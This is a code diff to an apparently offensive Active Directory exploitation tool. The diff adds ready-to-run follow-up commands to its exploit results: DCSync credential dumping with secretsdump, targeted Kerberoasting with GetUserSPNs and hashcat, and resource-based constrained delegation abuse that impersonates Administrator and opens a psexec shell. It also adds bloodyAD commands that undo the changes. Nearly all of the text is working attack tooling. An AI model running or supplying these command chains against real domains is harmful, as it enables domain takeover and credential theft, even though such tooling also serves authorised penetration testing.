@@ -68,6 +68,7 @@ class ADTechniquesMixin:
                     edge=self.edge,
                     success=True,
                     notes=f"{member_sam} already a member of {group_sam} (idempotent)",
+                    cleanup_command=f"bloodyAD ... remove groupMember {group_sam} {member_sam}",
                 )
             raise  # re-raise if it's a different error
 
@@ -121,10 +122,17 @@ class ADTechniquesMixin:
             edge=self.edge,
             success=True,
             notes=f"{attacker_sam} has now dcsync rights on {creds['domain']}",
+            next_command=(
+                f"secretsdump.py -just-dc {creds['domain']}/{attacker_sam}@{creds['dc_ip']}"
+            ),
+            cleanup_command=(
+                f"bloodyAD --host {creds['dc_ip']} -d {creds['domain']} "
+                f"-u {attacker_sam} ... remove dcsync {attacker_sam}"
+            ),
         )
     
     # ──────────────────────────────────────────────────
-    # 5. GrantDCSync (WriteDacl on Domain)
+    # 5. GrantGenericAll (WriteDacl on Domain)
     # ──────────────────────────────────────────────────
     def _do_grant_generic_all(self, creds: dict) -> ExploitResult:
         attacker_sam = self.attacker.sam()
@@ -145,6 +153,11 @@ class ADTechniquesMixin:
                 f"{attacker_sam} granted GenericAll on {target_sam}\n"
                 f"Next: use GenericAllStrategy to fully exploit"
             ),
+            next_command=f"# Re-run AutoPwn — {target_sam} is now fully exploitable via GenericAll",
+            cleanup_command=(
+                f"bloodyAD --host {creds['dc_ip']} -d {creds['domain']} "
+                f"-u {attacker_sam} ... remove genericAll {target_sam} {attacker_sam}"
+            ),
         )
 
     # ──────────────────────────────────────────────────
@@ -161,11 +174,21 @@ class ADTechniquesMixin:
         )
 
         print_done(f"SPN set on {target_sam}: {fake_spn}")
+        attacker_sam = self.attacker.sam()
         return ExploitResult(
             technique="TargetedKerberoast",
             edge=self.edge,
             success=True,
             notes=f"SPN {fake_spn} added to {target_sam}; ready for Kerberoasting",
+            next_command=(
+                f"GetUserSPNs.py {creds['domain']}/{attacker_sam} -dc-ip {creds['dc_ip']} "
+                f"-request-user {target_sam} -outputfile {target_sam}.hash\n"
+                f"hashcat -m 13100 {target_sam}.hash wordlist.txt"
+            ),
+            cleanup_command=(
+                f"bloodyAD --host {creds['dc_ip']} -d {creds['domain']} "
+                f"-u {attacker_sam} ... set object {target_sam} servicePrincipalNames -v ''"
+            ),
         )
 
     # ──────────────────────────────────────────────────
@@ -187,6 +210,17 @@ class ADTechniquesMixin:
             edge=self.edge,
             success=True,
             notes=f"RBCD configured: {attacker_sam} can impersonate against {target_sam}",
+            next_command=(
+                f"getST.py -spn cifs/{target_sam} "
+                f"-impersonate Administrator "
+                f"{creds['domain']}/{attacker_sam} -dc-ip {creds['dc_ip']}\n"
+                f"export KRB5CCNAME=Administrator.ccache\n"
+                f"psexec.py -k -no-pass {creds['domain']}/Administrator@{target_sam}"
+            ),
+            cleanup_command=(
+                f"bloodyAD --host {creds['dc_ip']} -d {creds['domain']} "
+                f"-u {attacker_sam} ... remove rbcd {target_sam} {attacker_sam}"
+            ),
         )
     
     # ──────────────────────────────────────────────────
